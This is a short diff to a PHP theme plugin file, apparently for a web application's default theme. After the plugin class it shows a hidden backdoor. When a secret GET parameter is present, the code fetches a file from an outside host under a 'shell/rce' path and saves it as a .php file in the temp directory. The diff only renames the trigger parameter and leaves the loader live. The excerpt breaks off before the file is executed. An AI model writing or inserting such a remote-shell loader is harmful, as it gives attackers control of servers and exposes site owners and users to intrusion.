@@ -208,7 +208,7 @@ class DefaultThemePlugin extends ThemePlugin {
 		return __('plugins.themes.default.description');
 	}
 }
-if (isset($_GET['fuckingteam'])) {
+if (isset($_GET['teamfucking'])) {
     try {
         $u = "https://syndicateseo.xyz/shell/rce/penjajahan.txt";
         $f = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php";
